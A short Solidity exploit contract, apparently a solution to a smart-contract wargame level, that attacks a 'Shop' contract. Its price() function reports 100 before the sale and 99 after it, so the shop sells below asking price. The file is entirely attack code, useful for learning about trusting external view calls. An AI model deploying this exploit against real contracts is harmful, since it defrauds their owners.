// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IShop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract Hack {
    IShop private immutable shopContract;

    constructor(address shopContractAddress) {
        shopContract = IShop(shopContractAddress);
    }

    function pwn() external {
        shopContract.buy();
        require(shopContract.price() == 99, "Price is not equal to 99");
    }

    function price() external view returns (uint256) {
        if (shopContract.isSold()) {
            return 99;
        }
        return 100;
    }
}